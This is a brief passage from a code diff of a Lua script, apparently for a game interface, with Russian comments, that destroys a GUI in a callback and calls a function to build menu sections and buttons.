+    -- Удаляем графический интерфейс
+    gui:Destroy()
+end)
+
+-- Вызываем функцию, которая создает все секции и кнопки меню
+createMenu()    
